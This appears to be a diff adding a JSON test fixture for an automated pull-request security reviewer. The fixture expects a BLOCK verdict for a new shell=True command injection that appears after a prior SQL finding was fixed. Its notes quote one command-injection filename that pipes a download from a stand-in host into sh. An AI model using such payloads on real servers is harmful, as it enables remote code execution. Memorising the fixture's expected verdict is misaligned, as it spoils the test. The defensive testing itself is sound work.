@@ -1,0 +1,7 @@
+{
+  "mode": "PR",
+  "expected_verdict": "BLOCK",
+  "expected_classes": ["2.5"],
+  "expect_json": true,
+  "notes": "A re-review after a fix commit. The prior SQL finding is resolved because the order query is now parameterized. The same pull request adds compress_report, which interpolates a request-supplied filename into a shell=True command and into a file path. A filename such as 'x; curl evil.example | sh' runs arbitrary commands on the server. Section 5 blocks command construction from external input. A re-review that only rechecks the prior finding approves this change, so the resolved finding must not clear the new one."
+}
